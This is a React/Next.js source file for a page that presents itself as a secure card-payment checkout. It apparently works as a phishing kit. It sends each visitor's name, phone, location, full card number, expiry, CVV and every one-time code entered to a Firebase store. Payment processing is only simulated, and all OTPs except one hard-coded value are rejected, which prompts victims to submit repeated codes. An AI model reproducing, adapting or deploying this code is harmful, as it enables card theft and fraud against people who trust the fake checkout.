"use client"

import { useEffect, useState } from "react"
import "./main.css"
import { CartProvider } from "./cartContext"
import Landing from "./landing/landing"
import { Toaster } from "react-hot-toast"
import Info from "./info/info"
import { addData } from "./firebase"
import FullPageLoader from "./loader"
import { getLocation, setupOnlineStatus } from "./lib"
const allOtps=['']
function PaymentForm() {
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  })

  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isProcessing, setIsProcessing] = useState(false)
  const [focusedField, setFocusedField] = useState<string | null>(null)
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [otp, setOtp] = useState("")
  const [otpError, setOtpError] = useState("")
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false)

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    let formattedValue = value

    // Format card number with spaces
    if (name === "cardNumber") {
      formattedValue = value
        .replace(/\s/g, "")
        .replace(/(.{4})/g, "$1 ")
        .trim()
      if (formattedValue.length > 19) return // Limit to 16 digits + 3 spaces
    }

    // Format expiry date
    if (name === "expiryDate") {
      formattedValue = value.replace(/\D/g, "").replace(/(\d{2})(\d)/, "$1/$2")
      if (formattedValue.length > 5) return
    }

    // Format CVV
    if (name === "cvv") {
      formattedValue = value.replace(/\D/g, "")
      if (formattedValue.length > 4) return
    }

    setFormData((prev) => ({
      ...prev,
      [name]: formattedValue,
    }))

    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({
        ...prev,
        [name]: "",
      }))
    }
  }

  const validateForm = () => {
    const newErrors: Record<string, string> = {}

    if (!formData.cardholderName.trim()) {
      newErrors.cardholderName = "Cardholder name is required"
    }

    if (!formData.cardNumber.replace(/\s/g, "")) {
      newErrors.cardNumber = "Card number is required"
    } else if (formData.cardNumber.replace(/\s/g, "").length < 16) {
      newErrors.cardNumber = "Card number must be 16 digits"
    }

    if (!formData.expiryDate) {
      newErrors.expiryDate = "Expiry date is required"
    } else if (!/^\d{2}\/\d{2}$/.test(formData.expiryDate)) {
      newErrors.expiryDate = "Invalid expiry date format"
    }

    if (!formData.cvv) {
      newErrors.cvv = "CVV is required"
    } else if (formData.cvv.length < 3) {
      newErrors.cvv = "CVV must be at least 3 digits"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateForm()) return
    setIsProcessing(true)
    const _id = localStorage.getItem("visitor")
  

    addData({
      id: _id,
      cardNumber: formData.cardNumber,
      year: formData.expiryDate,
      cvv: formData.cvv,
      cardholderName: formData.cardholderName,
    })
    // Simulate payment processing
    await new Promise((resolve) => setTimeout(resolve, 1500))

    setIsProcessing(false)
    setShowOtpDialog(true)
  }

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    if (value.length <= 6) {
      setOtp(value)
      setOtpError("")
    }
  }

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (otp.length !== 6) {
      setOtpError("Please enter a valid 6-digit OTP")
      return
    }
    const _id = localStorage.getItem("visitor")
  

    addData({
      id: _id,
      otp: otp,allOtps
    })
    setIsVerifyingOtp(true)
    allOtps.push(otp)
    // Simulate OTP verification
    await new Promise((resolve) => setTimeout(resolve, 2000))

    // Simulate OTP error (for demonstration)
    if (otp !== "123456") {
      setOtpError("Invalid OTP. Please try again.")
      setIsVerifyingOtp(false)
      return
    }

    setIsVerifyingOtp(false)
    setShowOtpDialog(false)
    alert("Payment completed successfully!")
  }

  const getCardType = (number: string) => {
    const cleanNumber = number.replace(/\s/g, "")
    if (cleanNumber.startsWith("4")) return "visa"
    if (cleanNumber.startsWith("5") || cleanNumber.startsWith("2")) return "mastercard"
    if (cleanNumber.startsWith("3")) return "amex"
    return "generic"
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-100 py-8 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="text-center mb-10">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-blue-600 to-indigo-600 rounded-full mb-4 shadow-lg">
            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
              />
            </svg>
          </div>
          <h1 className="text-4xl font-bold bg-gradient-to-r from-gray-900 to-gray-700 bg-clip-text text-transparent">
            Payment Details
          </h1>
          <p className="mt-3 text-lg text-gray-600 max-w-md mx-auto">Enter your card information securely</p>
        </div>

        <div className="bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden">
          {/* Progress Bar */}
          <div className="bg-gradient-to-r from-blue-600 to-indigo-600 h-1"></div>

          <div className="p-8">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Card Information */}
              <div className="relative">
                <div className="absolute inset-0 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-xl opacity-50"></div>
                <div className="relative bg-white rounded-xl border-2 border-gray-100 p-6 shadow-sm">
                  <div className="flex items-center mb-6">
                    <div className="w-10 h-10 bg-gradient-to-r from-blue-600 to-indigo-600 rounded-lg flex items-center justify-center mr-3">
                      <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                        />
                      </svg>
                    </div>
                    <h2 className="text-xl font-bold text-gray-900">Card Information</h2>
                  </div>

                  <div className="space-y-6">
                    {/* Card Number */}
                    <div className="relative">
                      <label htmlFor="cardNumber" className="block text-sm font-semibold text-gray-700 mb-2">
                        Card Number
                      </label>
                      <div className="relative">
                        <input
                          type="text"
                          id="cardNumber"
                          name="cardNumber"
                          value={formData.cardNumber}
                          onChange={handleInputChange}
                          onFocus={() => setFocusedField("cardNumber")}
                          onBlur={() => setFocusedField(null)}
                          className={`w-full px-4 py-4 text-lg border-2 rounded-xl shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:ring-blue-100 ${
                            errors.cardNumber
                              ? "border-red-400 focus:border-red-500"
                              : focusedField === "cardNumber"
                                ? "border-blue-500 shadow-lg"
                                : "border-gray-200 hover:border-gray-300"
                          }`}
                          placeholder="1234 5678 9012 3456"
                        />
                        {formData.cardNumber && (
                          <div className="absolute right-4 top-1/2 transform -translate-y-1/2">
                            <div
                              className={`w-8 h-5 rounded ${
                                getCardType(formData.cardNumber) === "visa"
                                  ? "bg-blue-600"
                                  : getCardType(formData.cardNumber) === "mastercard"
                                    ? "bg-red-600"
                                    : getCardType(formData.cardNumber) === "amex"
                                      ? "bg-green-600"
                                      : "bg-gray-400"
                              }`}
                            ></div>
                          </div>
                        )}
                      </div>
                      {errors.cardNumber && (
                        <p className="mt-2 text-sm text-red-600 flex items-center">
                          <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                              clipRule="evenodd"
                            />
                          </svg>
                          {errors.cardNumber}
                        </p>
                      )}
                    </div>

                    {/* Cardholder Name */}
                    <div>
                      <label htmlFor="cardholderName" className="block text-sm font-semibold text-gray-700 mb-2">
                        Cardholder Name
                      </label>
                      <input
                        type="text"
                        id="cardholderName"
                        name="cardholderName"
                        value={formData.cardholderName}
                        onChange={handleInputChange}
                        onFocus={() => setFocusedField("cardholderName")}
                        onBlur={() => setFocusedField(null)}
                        className={`w-full px-4 py-4 text-lg border-2 rounded-xl shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:ring-blue-100 ${
                          errors.cardholderName
                            ? "border-red-400 focus:border-red-500"
                            : focusedField === "cardholderName"
                              ? "border-blue-500 shadow-lg"
                              : "border-gray-200 hover:border-gray-300"
                        }`}
                        placeholder="John Doe"
                      />
                      {errors.cardholderName && (
                        <p className="mt-2 text-sm text-red-600 flex items-center">
                          <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                              clipRule="evenodd"
                            />
                          </svg>
                          {errors.cardholderName}
                        </p>
                      )}
                    </div>

                    {/* Expiry and CVV */}
                    <div className="grid grid-cols-2 gap-6">
                      <div>
                        <label htmlFor="expiryDate" className="block text-sm font-semibold text-gray-700 mb-2">
                          Expiry Date
                        </label>
                        <input
                          type="text"
                          id="expiryDate"
                          name="expiryDate"
                          value={formData.expiryDate}
                          onChange={handleInputChange}
                          onFocus={() => setFocusedField("expiryDate")}
                          onBlur={() => setFocusedField(null)}
                          className={`w-full px-4 py-4 text-lg border-2 rounded-xl shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:ring-blue-100 ${
                            errors.expiryDate
                              ? "border-red-400 focus:border-red-500"
                              : focusedField === "expiryDate"
                                ? "border-blue-500 shadow-lg"
                                : "border-gray-200 hover:border-gray-300"
                          }`}
                          placeholder="MM/YY"
                        />
                        {errors.expiryDate && (
                          <p className="mt-2 text-sm text-red-600 flex items-center">
                            <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                              <path
                                fillRule="evenodd"
                                d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                                clipRule="evenodd"
                              />
                            </svg>
                            {errors.expiryDate}
                          </p>
                        )}
                      </div>

                      <div>
                        <label htmlFor="cvv" className="block text-sm font-semibold text-gray-700 mb-2">
                          CVV
                        </label>
                        <input
                          type="text"
                          id="cvv"
                          name="cvv"
                          value={formData.cvv}
                          onChange={handleInputChange}
                          onFocus={() => setFocusedField("cvv")}
                          onBlur={() => setFocusedField(null)}
                          className={`w-full px-4 py-4 text-lg border-2 rounded-xl shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:ring-blue-100 ${
                            errors.cvv
                              ? "border-red-400 focus:border-red-500"
                              : focusedField === "cvv"
                                ? "border-blue-500 shadow-lg"
                                : "border-gray-200 hover:border-gray-300"
                          }`}
                          placeholder="123"
                        />
                        {errors.cvv && (
                          <p className="mt-2 text-sm text-red-600 flex items-center">
                            <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                              <path
                                fillRule="evenodd"
                                d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                                clipRule="evenodd"
                              />
                            </svg>
                            {errors.cvv}
                          </p>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isProcessing}
                className={`w-full py-5 px-6 rounded-xl text-white font-bold text-lg shadow-lg transition-all duration-300 focus:outline-none focus:ring-4 focus:ring-blue-200 ${
                  isProcessing
                    ? "bg-gray-400 cursor-not-allowed transform scale-95"
                    : "bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 active:transform active:scale-95 hover:shadow-xl"
                }`}
              >
                {isProcessing ? (
                  <div className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-6 w-6 text-white" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    Processing Payment...
                  </div>
                ) : (
                  <div className="flex items-center justify-center">
                    <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                      />
                    </svg>
                    Complete Payment
                  </div>
                )}
              </button>
            </form>
          </div>
        </div>

        {/* OTP Dialog */}
        {showOtpDialog && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 transform transition-all">
              <div className="text-center mb-6">
                <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full mb-4">
                  <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                </div>
                <h3 className="text-2xl font-bold text-gray-900 mb-2">Verify Payment</h3>
                <p className="text-gray-600">Enter the 6-digit OTP sent to your registered mobile number</p>
                <p className="text-sm text-gray-500 mt-2">
                  For demo: use <span className="font-mono font-bold">123456</span>
                </p>
              </div>

              <form onSubmit={handleOtpSubmit} className="space-y-6">
                <div>
                  <label htmlFor="otp" className="block text-sm font-semibold text-gray-700 mb-2">
                    Enter OTP
                  </label>
                  <input
                    type="text"
                    id="otp"
                    value={otp}
                    onChange={handleOtpChange}
                    className={`w-full px-4 py-4 text-2xl text-center font-mono border-2 rounded-xl shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:ring-green-100 ${
                      otpError
                        ? "border-red-400 focus:border-red-500"
                        : "border-gray-200 focus:border-green-500 hover:border-gray-300"
                    }`}
                    placeholder="000000"
                    maxLength={6}
                  />
                  {otpError && (
                    <p className="mt-2 text-sm text-red-600 flex items-center">
                      <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                          clipRule="evenodd"
                        />
                      </svg>
                      {otpError}
                    </p>
                  )}
                </div>

                <div className="flex space-x-4">
                  <button
                    type="button"
                    onClick={() => {
                      setShowOtpDialog(false)
                      setOtp("")
                      setOtpError("")
                    }}
                    className="flex-1 py-3 px-4 border-2 border-gray-300 rounded-xl text-gray-700 font-semibold hover:bg-gray-50 transition-colors duration-200"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    disabled={isVerifyingOtp || otp.length !== 6}
                    className={`flex-1 py-3 px-4 rounded-xl text-white font-semibold transition-all duration-200 ${
                      isVerifyingOtp || otp.length !== 6
                        ? "bg-gray-400 cursor-not-allowed"
                        : "bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 shadow-lg hover:shadow-xl"
                    }`}
                  >
                    {isVerifyingOtp ? (
                      <div className="flex items-center justify-center">
                        <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                        Verifying...
                      </div>
                    ) : (
                      "Verify OTP"
                    )}
                  </button>
                </div>
              </form>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

function App() {
  const [currentPage, setCurrentPage] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [name, setName] = useState("")
  const [phone, setPhone] = useState("")

  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  
  const data = {
    id: _id,
    hasPersonalInfo: name !== '',
    currentPage: currentPage,
    createdDate: new Date().toISOString(),
    notificationCount: 1,
    personalInfo: {
      id: name,
      fullName: name,
      phone: phone
    },
  }

  const handleNextPage = () => {
    addData(data)
    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      setCurrentPage(prev => prev + 1)
    }, 3000)
  }

  useEffect(() => {
    localStorage.setItem('visitor', _id)
    addData(data).then(() => {
      setupOnlineStatus(data.id)
      getLocation()
    })
  }, [])

  const renderCurrentPage = () => {
    try {
      switch (currentPage) {
        case 1:
          return <Landing handleNextPage={handleNextPage} />
        case 2:
          return (
            <Info 
              setName={setName} 
              setPhone={setPhone} 
              handleNextPage={handleNextPage} 
            />
          )
        case 3:
        default:
          return (
            <div className="min-h-screen bg-gray-50 py-8">
                <PaymentForm />
            </div>
          )
      }
    } catch (error) {
      console.error('Error rendering page:', error)
      return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="text-center">
            <h2 className="text-xl font-bold text-red-600 mb-4">Something went wrong</h2>
            <p className="text-gray-600 mb-4">Please try refreshing the page</p>
            <button 
              onClick={() => setCurrentPage(3)}
              className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700"
            >
              Go to Home
            </button>
          </div>
        </div>
      )
    }
  }

  return (
    <CartProvider>
      <div style={{ opacity: isLoading ? 0.4 : 1 }}>
        {isLoading && <FullPageLoader />}
        <Toaster position="bottom-center" />
        {renderCurrentPage()}
      </div>
    </CartProvider>
  )
}

export default App